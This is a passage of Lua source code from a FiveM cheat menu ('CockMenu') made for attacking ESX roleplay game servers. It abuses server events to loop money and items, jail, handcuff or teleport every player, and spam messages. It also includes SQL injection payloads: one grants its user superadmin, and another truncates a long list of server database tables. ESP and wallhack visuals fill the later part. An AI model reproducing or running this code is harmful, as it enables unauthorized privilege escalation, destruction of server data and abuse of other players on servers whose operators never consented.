                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['doorlock_sound1'], 113.0, 'unlockDoor', 0.8)
                               end y = y + 0.015
                           end
                           if dynamic.TR['interact_sound1'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Sound 2', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['interact_sound1'], 113.0, 'unlockDoor', 0.8)
                               end y = y + 0.015
                           end
                           if dynamic.TR['interact_sound1'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Sound 3', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['interact_sound2'], 113.0, 'lockDoor', 0.8)
                               end y = y + 0.015
                           end
   
                           
                           if dynamic.TR['reviveesx'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Revive', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['reviveesx'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['reviveesx2'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Revive', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['reviveesx2'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['policejob_handcuff'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Handcuff player', 0.422, y, false, true) then
                                   local id =  Functions.f.CustomInput('Player Id', '', 3)
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['policejob_handcuff'], id)
   
                               end y = y + 0.015
                           end
                           if dynamic.TR['policejob_handcuff'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Handcuff all players', 0.422, y, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['policejob_handcuff'], i)
                                   end
                               end y = y + 0.015
                           end
                           if dynamic.TR['policejob_spammer'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Spam messages', 0.422, y, false, true) then
                                   CockT.Inv["Thread"](function()
                                       local text =  Functions.f.CustomInput('Message to send', 'CockMenu on Top!', 1000)
                                       local amount =  Functions.f.CustomInput('Times to loop', '10', 3)
                                       for i = 1, CockT.Math.tonumber(amount) do
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['policejob_spammer'], -1, '('..i..') '..CockT.Strings.tostring(text))
                                           CockT.Inv["Wait"](60)
                                       end
                                   end)
                               end y = y + 0.015
                           end
                           if dynamic.TR['vangelico_get'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Give jewlery', 0.422, y, false, true) then
                                   dynamic.TR.MoneyLoop = not dynamic.TR.MoneyLoop
                                   CockT.Inv["Thread"](function()
                                       while dynamic.TR.MoneyLoop do
                                           CockT.Inv["Wait"](200)
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['vangelico_get'])
                                       end
                                   end)
                               end y = y + 0.015
                           end
                           if dynamic.TR['vangelico_sell'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Sell jewlery', 0.422, y, false, true) then
                                   local amount =  Functions.f.CustomInput('Amount to sell', '', 3)
                                   for i = 0, CockT.Math.tonumber(amount-1) do
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['vangelico_sell'])
                                   end
                               end y = y + 0.015
                           end
                           if dynamic.TR['dmv_getlicense'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Add all licenses', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['dmv_getlicense'], 'dmv')
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['dmv_getlicense'], 'drive')
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['dmv_getlicense'], 'drive_bike')
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['dmv_getlicense'], 'drive_truck')
                               end y = y + 0.015
                           end
                           if dynamic.TR['tp_all_to_me'] then
                               if CockMenu.Main.Button('Teleport everyone to me', 0.422, y, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['tp_all_to_me'], i)
                                   end
                               end y = y + 0.015
                           end
                           if dynamic.TR['carry_exploit'] then
                               if CockMenu.Main.Button('Carry all', 0.422, y, false, true) then
                                   CockT.Inv["Thread"](function()
                                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                                           if Fatasf.n.GetPlayerPed(v) ~= Fatasf.n.PlayerPedId() then 
                                               CockT.Global.TriggerCustomEvent(true, dynamic.TR['carry_exploit'], Fatasf.n.GetPlayerPed(v), 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63,Fatasf.n.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                               CockT.Inv["Wait"](10)
                                           end
                                       end
                                       return
                                   end)
                               end y = y + 0.015
                           end
                           if dynamic.TR['carry_exploitv2'] then
                               if CockMenu.Main.Button('Teleport all to ocean', 0.422, y, false, true) then
                                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                                       local ped = Fatasf.n.GetPlayerPed(v)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR["carry_exploitv2"], ped, "missfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63,Fatasf.n.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                       CockT.Inv["Wait"](150)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR["carrypeople_stop"],Fatasf.n.GetPlayerServerId(v))
                                       CockT.Inv["Wait"](150)
                                   end
                               end y = y + 0.015
                           end
   
                           if dynamic.TR['addSuperadmin'] then
                               if CockMenu.Main.Button('Add admin', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['addSuperadmin'], "';UPDATE `users` SET `permission_level` = '4', `group` = 'superadmin'where_DSGHSDIUGSDG `users`.`name` = '"..NetworkPlayerGetName(Fatasf.n.PlayerId()).."';")
                               end y = y + 0.015
                           end
       
                           --carry_exploitv2
                           if dynamic.TR['delete_DB'] then
                               if CockMenu.Main.Button('Delete database', 0.422, y, false, true) then
                                   CockT.Inv["Thread"](function()
                                       trashTables = {
                                           'addon_account',
                                           'addon_account_data',
                                           'addon_inventory',
                                           'addon_inventory_items',
                                           'billing',
                                           'charicters',
                                           'datastore',
                                           'datastore_data',
                                           'fine_types',
                                           'items',
                                           'jobs',
                                           'job_grades',
                                           'licenses',
                                           'owned_properties',
                                           'phone_app_chat',
                                           'phone_calls',
                                           'phone_messages',
                                           'phone_users_contacts',
                                           'properties',
                                           'rented_vehicles',
                                           'shops',
                                           'society_moneywash',
                                           'users',
                                           'user_accounts',
                                           'user_inventory',
                                           'user_licenses',
                                           'vehicles',
                                           'vehicle_categories',
                                           'vehicle_sold',
                                           'weashops'
                                       }
                                       for key, value in CockT.Math.pairs(trashTables) do
                                           CockT.Inv["Wait"](25)
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['delete_DB'], '\';TRUNCATE TABLE '..value..';-- /')
                                       end
                                       return
                                   end)
                               end y = y + 0.015
                           end
                           if dynamic.TR['open_inv'] then
                               if CockMenu.Main.Button('Open player inventory', 0.422, y, false, true) then
                                   local id =  Functions.f.CustomInput("Enter A Person's ID", '', 10)
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['open_inv'], "otherplayer", id)	
                               end y = y + 0.015
                           end
                           if dynamic.TR['Money_Wash'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Wash money', 0.422, y, false, true) then
                                   local money = Functions.f.CustomInput("Money ammount", '', 10)
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['Money_Wash'], money, 0)
                               end y = y + 0.015
                           end
                           if dynamic.TR['play_song'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Play custom song', 0.422, y, false, true) then
                                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       local person = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(v))
                                       local song =  Functions.f.CustomInput("Enter a video link (youtbe)", '', 30)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['play_da_sound'], song, person)
                                   end
                               end y = y + 0.015
                           end
                           if dynamic.TR['Money_Wash_Zone'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Wash Money', 0.422, y, false, true) then
                                   local ammount =  Functions.f.CustomInput("Enter ammount", '', 30)
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['Money_Wash_Zone'], ammount)
                               end y = y + 0.015
                           end
                           if dynamic.TR['garbagejob_pay'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Give money (garbagejob)', 0.422, y, false, true) then
                                   local ammount =  Functions.f.CustomInput("Enter ammount", '', 30)
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['garbagejob_pay'], ammount)
                               end y = y + 0.015
                           end
                           if dynamic.TR['send_bill'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Send bill', 0.422, y, false, true) then
                                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                                      for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Inv["Wait"](60)
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR["send_bill"],Fatasf.n.GetPlayerServerId(v), "Cock Menu", 9999999)
                                       end
                       
                                       CockT.Inv["Wait"](100)
                                   end
                               end y = y + 0.015
                           end
                           if dynamic.TR['qalle_jailer'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Jail all players', 0.422, y, false, true) then
                                   local reason =  Functions.f.CustomInput('Custom Reason', '', 30)
                                   if reason == nil then reason = 'Cock Menu on top' end
                                      for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['qalle_jailer'],Fatasf.n.GetPlayerServerId(i), 1000000, reason)
                                       end
                               end y = y + 0.015
                           end
                           if dynamic.TR['esx_jailer:sendToJail'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Jail all players v2', 0.422, y, false, true) then
                                   local reason =  Functions.f.CustomInput('Custom Reason', '', 30)
                                           if reason == nil then reason = 'Cock Menu on top' end
                                          for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                               CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_jailer:sendToJail'],Fatasf.n.GetPlayerServerId(i), 1000000, reason)
                                           end
                               end y = y + 0.015
                           end
                           if dynamic.TR['gopostal_pay'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Give money (gopostal)', 0.422, y, false, true) then
                                   local ammount = Functions.f.CustomInput('Ammount?', '', 30)
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['gopostal_pay'], ammount)
                               end y = y + 0.015
                           end
                           if dynamic.TR['esx_status_hungerandthirst'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Refill hunger and thirst', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(false, dynamic.TR['esx_status_hungerandthirst'], 'hunger', 1000000)
                                   CockT.Global.TriggerCustomEvent(false, dynamic.TR['esx_status_hungerandthirst'], 'thirst', 1000000)
                               end y = y + 0.015
                           end
                           if dynamic.TR['add_vehicle'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Add vehicle to garage', 0.422, y, false, true) then
                                   local car = Functions.f.CustomInput('Vehicle', '', 30)
                                   if Fatasf.n.IsModelValid(Fatasf.n.GetHashKey(car)) and Fatasf.n.IsModelAVehicle(car) then
                                       local customplate = Functions.f.CustomInput('Vehicle plate', '', 30)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['vehicleshop_ownedveh'], {['model'] = Fatasf.n.GetHashKey(CockT.Strings.tostring(car)), ['plate'] = CockT.Strings.tostring(customplate)})
                                   end
                               end y = y + 0.015
                           end
   
                           if dynamic.TR['esx_holdup'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Money (Bank Robber)', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_holdup'])
                               end y = y + 0.015
                           end
   
                           if dynamic.TR['esx_carwash:success'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Remove Money', 0.405, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_carwash:success'])
                               end y = y + 0.015
                           end
                           
                       end
   
                       if tab == "KeybindsManager" then
                           CockMenu.Main.LoadUi()
                           local y = 0.37
                           if CockMenu.Main.Button('Open Menu: ~g~['..CockMenu.CockKeybinds.Menu.OpenMenuKey["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.OpenMenuKey["Label"] = label
                               CockMenu.CockKeybinds.Menu.OpenMenuKey["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Noclip: ~g~['..CockMenu.CockKeybinds.Menu.Noclip["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.Noclip["Label"] = label
                               CockMenu.CockKeybinds.Menu.Noclip["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Heal: ~g~['..CockMenu.CockKeybinds.Menu.Heal["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.Heal["Label"] = label
                               CockMenu.CockKeybinds.Menu.Heal["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Revive: ~g~['..CockMenu.CockKeybinds.Menu.Revive["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.Revive["Label"] = label
                               CockMenu.CockKeybinds.Menu.Revive["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Armour: ~g~['..CockMenu.CockKeybinds.Menu.Armour["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.Armour["Label"] = label
                               CockMenu.CockKeybinds.Menu.Armour["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Freecam: ~g~['..CockMenu.CockKeybinds.Menu.Freecam["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.Freecam["Label"] = label
                               CockMenu.CockKeybinds.Menu.Freecam["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Godmode: ~g~['..CockMenu.CockKeybinds.Menu.Godmode["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.Godmode["Label"] = label
                               CockMenu.CockKeybinds.Menu.Godmode["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Fix Vehicle: ~g~['..CockMenu.CockKeybinds.Menu.fixveh["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.fixveh["Label"] = label
                               CockMenu.CockKeybinds.Menu.fixveh["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Vintage pistol: ~g~['..CockMenu.CockKeybinds.Menu.givevintage["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.givevintage["Label"] = label
                               CockMenu.CockKeybinds.Menu.givevintage["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Normal pistol: ~g~['..CockMenu.CockKeybinds.Menu.givepistol["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.givepistol["Label"] = label
                               CockMenu.CockKeybinds.Menu.givepistol["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Invisible: ~g~['..CockMenu.CockKeybinds.Menu.invisible["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.invisible["Label"] = label
                               CockMenu.CockKeybinds.Menu.invisible["Value"] = value
                           end y = y + 0.015
                           if CockMenu.Main.Button('Unlock vehicle: ~g~['..CockMenu.CockKeybinds.Menu.unlockveh["Label"]..']', 0.422, y, false, true) then
                               local value, label = Functions.f.BindOnStart()
                               CockMenu.CockKeybinds.Menu.unlockveh["Label"] = label
                               CockMenu.CockKeybinds.Menu.unlockveh["Value"] = value
                           end y = y + 0.015
                       end
           
                       if tab == "Settings" then
                           
                           if CockMenu.Main.Checkbox('Blur while menu opened',0.425, 0.37, Cock.Menu.blurmenu, false) then
                               Cock.Menu.blurmenu = not Cock.Menu.blurmenu
                           end
                           if CockMenu.Main.Checkbox('Use custom input',0.425, 0.385, CockT.UseCustomInput, false) then
                               CockT.UseCustomInput = not CockT.UseCustomInput
                           end
   
                           
                           if CockMenu.Main.Button('Credits', 0.422, 0.39, false, true) then
                               Fatasf.n.Leprint("")
                               Fatasf.n.Leprint("^1[^2CockMenu Credits^1] ^7Delder")
                               Fatasf.n.Leprint("^1[^2CockMenu Credits^1] ^7Alky")
                               Fatasf.n.Leprint("^1[^2CockMenu Credits^1] ^7BMD (Graphics)")
                               Fatasf.n.Leprint("^1[^2CockMenu Credits^1] ^7bäärs#3150")
                               Fatasf.n.Leprint("")
                           end
                           
                           if CockMenu.Main.Button('Keybinds manager', 0.422, 0.405, false, true) then
                               tab = "KeybindsManager"
                           end
                           if CockMenu.Main.Button('Kill menu', 0.422, 0.42, false, true) then
                               local input = Functions.f.CustomInput('Are you sure? (yes / no)', '', 5)
                               if input == 'yes' then
                                   CockMenu.MenuEnabled = false
                               else         
                               end
                           end
                           if CockMenu.Main.Button('Disconnect', 0.422, 0.435, false, true) then
                               local input = Functions.f.CustomInput('Are you sure? (yes / no)', '', 5)
                               if input == 'yes' then
                                   Fatasf.n.RestartGame()
                                   Fatasf.n.ForceSocialClubUpdate()
                               else
                               end
                           end
   
                           --[[ if CockMenu.Main.Button('Load #1', 0.422, 0.45, false, true) then
                               local Id = Fatasf.n.GetRedUid()
                               local new = Fatasf.n.RequestFromWeb("https://cock.menu/configs/load/"..Id.."/1", nil, 'get')
                               local decodedMessage = CockT.Strings.jsondecode(new)
                               local decodedReal = CockT.Strings.jsondecode(decodedMessage.config.config1)
                               if new ~= nil then
                                   Cock.Menu = decodedReal
                                   --CockMeni.Functions.AddNotification('Loaded config: #1', "INFO", 5000)
                               else
                                   --CockMeni.Functions.AddNotification('Damn bro, server is down', "ERROR", 5000)
                               end
                           end
   
                           if CockMenu.Main.Button('Save #1', 0.422, 0.465, false, true) then
                               local uid = Fatasf.n.GetRedUid()
                               Fatasf.n.RequestFromWeb("https://cock.menu/configs/save/"..uid.."/1", {
                               configData = CockT.Strings.jsonencode(Cock.Menu)
                               }, 'post')
                               --CockMeni.Functions.AddNotification('Saved config: #1', "INFO", 5000)
                           end ]]
                           --[[ if CockMenu.Main.Button('Report bug', 0.422, 0.48, false, true) then
                               local message =  Functions.f.CustomInput('Message to support', '', 2000)
                               local name =  Fatasf.n.GetPlayerName(Fatasf.n.PlayerId())
                               local reuid = Fatasf.n.GetRedUid()
                               local hex = "NaN"-- to do
                               local ip = Fatasf.n.GetCurrentServerEndpoint()
                               --local playerdata = Fatasf.n.IsPedDeadOrDying(Fatasf.n.PlayerPedId(), 1) and "Dead " or "Alive "
                               if Fatasf.n.GetEntityHealth(Fatasf.n.PlayerPedId()) < 1 then
                                   playerdata = "Dead"
                               else
                                   playerdata = "Alive"
                               end
                               local url = "https://cock.menu/iuhdsfiash/reports.html".."?user="..name.."&message="..message.."&sip="..ip.."&status="..playerdata.."&hex="..hex.."&reuid="..reuid
                               local log_dui = Fatasf.n.CreateAnDui(url, 50, 50)
                               Fatasf.n.DestroyDui(log_dui)
                           end ]]
                           if CockMenu.Main.Button('Go back to loader', 0.422, 0.495, false, true) then
                               CockMenu.MenuEnabled = false
                               CockT.Global.hIvkXiYg2ogzm1MvdOolDhAhwQdBwv()
                           end
       
                           CockMenu.Main.Slider('Main colour (Red)', 0.5, 0.52, Cock.Sliders['MainR'], Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value)
                           CockMenu.Main.Slider('Main colour (Green)', 0.5, 0.545, Cock.Sliders['MainG'], Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value)
                           CockMenu.Main.Slider('Main colour (Blue)', 0.5, 0.57, Cock.Sliders['MainB'], Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value)
                           CockMenu.Main.Slider('Main colour (Alpha)', 0.5, 0.595, Cock.Sliders['MainA'], Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value)
                       end
                       if tab == "Music" then
                           if CockMenu.Main.Button('~r~Sorry but your version does not support music!\nCurrent version: '..CockMenu.Build..' (mouseui)', 0.422, 0.36, false, true) then
                           end
                       end
                       if tab == "Vehicles" then
                           if CockMenu.Main.Button('(Addons)', 0.422, 0.36, false, true) then
                               tab = "Addons"
                               CockT.Inv["Wait"](10)
                           end
                           if CockMenu.Main.Checkbox('Spawn in car',0.425, 0.39, Cock.Menu.SpawnInCar, false) then
                               Cock.Menu.SpawnInCar = not Cock.Menu.SpawnInCar
                           end
                           if CockMenu.Main.Button('Spawn vehicle', 0.422, 0.395, false, true) then
                               local car =  Functions.f.CustomInput('Create Vehicle', '', 30)
                               Functions.f.SpawnVehicle(car)
                           end
                           if CockMenu.Main.Button('Repair', 0.422, 0.41, false, true) then
                               Functions.f.RepairVehicle()
                           end
                           if CockMenu.Main.Button('Max tuning', 0.422, 0.425, false, true) then
                               CockT.Global.MaxTuning()
                           end
                           if CockMenu.Main.Button('Performance tuning', 0.422, 0.44, false, true) then
                               CockT.Global.PerformanceTuning(Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false))
                           end
                           if CockMenu.Main.Button('Tuning with ramp', 0.422, 0.455, false, true) then
                               CockT.Global.TuningRamp()
                           end
                           if CockMenu.Main.Button('Flip vehicle', 0.422, 0.47, false, true) then
                               Functions.f.FlipVehicle()
                           end
                           if CockMenu.Main.Button('Delete vehicle', 0.422, 0.485, false, true) then
                               Fatasf.n.DeleteEntity(Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId()))
                           end
                           if CockMenu.Main.Button('Unlock closest vehicle', 0.422, 0.5, false, true) then
                               local vehicle = CockT.Inv["Invoke"](CockT.Natives['GetClosestVehicle'], Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 25.0, 0, 70)
                               Functions.f.UnlockVehicle(vehicle)
                           end
                           if CockMenu.Main.Button('Lock closest vehicle', 0.422, 0.515, false, true) then
                               local vehicle = CockT.Inv["Invoke"](CockT.Natives['GetClosestVehicle'], Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 25.0, 0, 70)
                               Functions.f.LockVehicle(vehicle)
                           end
                           if CockMenu.Main.Button('Custom colour', 0.422, 0.53, false, true) then
                               Cock.Menu.cvcolour = not Cock.Menu.cvcolour
                           end
                           if CockMenu.Main.Button('Clean vehicle', 0.422, 0.545, false, true) then
                               CockT.Global.CleanVehicle()
                           end
                           if CockMenu.Main.Button('Change plate', 0.422, 0.56, false, true) then
                               local result =  Functions.f.CustomInput('Enter Vehicle Plate', 'CockMenu', 8)
                               local car = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
                               Fatasf.n.SetVehicleNumberPlateText(car, result) 
                           end
                           if CockMenu.Main.Button('Random vehicle colour', 0.422, 0.575, false, true) then
                               CockT.Global.RandomColour()
                           end
                           if CockMenu.Main.Checkbox('Cock Plate',0.425, 0.6, Cock.Menu.cockplate, false) then
                               Cock.Menu.cockplate = not Cock.Menu.cockplate
                           end
                           if CockMenu.Main.Checkbox('Drive to waypoint',0.425, 0.615, Cock.Menu.DriveToWaypoint, false) then
                               Cock.Menu.DriveToWaypoint = not Cock.Menu.DriveToWaypoint
                           end
                           if CockMenu.Main.Checkbox('NoFall',0.425, 0.63, Cock.Menu.nofall, false) then
                               Cock.Menu.nofall = not Cock.Menu.nofall
                           end
                       end
                       if tab == "Addons" then
                           CockMenu.Main.LoadUi()
                           local y = 0.365
                           for k, v in CockT.Math.pairs(CockT.AddonVehs) do
                               if Fatasf.n.IsModelValid(Fatasf.n.GetHashKey(v.spawn)) then
                                   if CockMenu.Main.Button(v.name, 0.422, y, false, true) then
                                       Functions.f.SpawnVehicle(v.spawn)
                                   end
                                   y = y + 0.015
                               end
                           end
                           
                       end
                       if tab == "Visuals" then
                           local scroll = 0.365 + Cock.Menu.scr_vis
                           
                           if CockT.Global.Zones(0.498+drag_x2, 0.465+drag_y2, 0.17, 0.45) then
                               if Fatasf.n.IsDisabledControlPressed(0, 14) and scroll > (0.365 - (8 * 0.015)) then
                                   Cock.Menu.scr_vis = Cock.Menu.scr_vis - 0.015
                               end
                               if Fatasf.n.IsDisabledControlJustPressed(0, 15) and scroll ~= 0.365 then
                                   Cock.Menu.scr_vis = Cock.Menu.scr_vis + 0.015
                               end
                           end
   
                           
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Include self',0.425, scroll, Cock.Menu.includeself, false) then
                                   Cock.Menu.includeself = not Cock.Menu.includeself
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('2D Boxes (#1)',0.425, scroll, Cock.Menu.boxes, false) then
                                   Cock.Menu.boxes = not Cock.Menu.boxes
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('2D Boxes (#2)',0.425, scroll, Cock.Menu.boxesV2, false) then
                                   Cock.Menu.boxesV2 = not Cock.Menu.boxesV2
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('2D Boxes (#3)',0.425, scroll, Cock.Menu.boxesV3, false) then
                                   Cock.Menu.boxesV3 = not Cock.Menu.boxesV3
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Corner Boxes',0.425, scroll, Cock.Menu.cornerbox, false) then
                                   Cock.Menu.cornerbox = not Cock.Menu.cornerbox
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Health bar',0.425, scroll, Cock.Menu.hpbar, false) then
                                   Cock.Menu.hpbar = not Cock.Menu.hpbar
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Armour bar',0.425, scroll, Cock.Menu.armourbar, false) then
                                   Cock.Menu.armourbar = not Cock.Menu.armourbar
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Glow ESP',0.425, scroll, Cock.Menu.espglow, false) then
                                   Cock.Menu.espglow = not Cock.Menu.espglow
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Player blips',0.425, scroll, Cock.Menu.blipsonmap, false) then
                                   Cock.Menu.blipsonmap = not Cock.Menu.blipsonmap
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Vehicle ESP',0.425, scroll, Cock.Menu.vehesp, false) then
                                   Cock.Menu.vehesp = not Cock.Menu.vehesp
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Tracers',0.425, scroll, Cock.Menu.tracers, false) then
                                   Cock.Menu.tracers = not Cock.Menu.tracers
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Info',0.425, scroll, Cock.Menu.infos, false) then
                                   Cock.Menu.infos = not Cock.Menu.infos
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Display radar',0.425, scroll, Cock.Menu.displayradar, false) then
                                   Cock.Menu.displayradar = not Cock.Menu.displayradar
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Skeletons',0.425, scroll, Cock.Menu.skeletons, false) then
                                   Cock.Menu.skeletons = not Cock.Menu.skeletons
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Crosshair',0.425, scroll, Cock.Menu.Crosshair, false) then
                                   Cock.Menu.Crosshair = not Cock.Menu.Crosshair
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Show coords',0.425, scroll, Cock.Menu.showcoords, false) then
                                   Cock.Menu.showcoords = not Cock.Menu.showcoords
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Road detector',0.425, scroll, Cock.Menu.roadetector, false) then
                                   Cock.Menu.roadetector = not Cock.Menu.roadetector
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
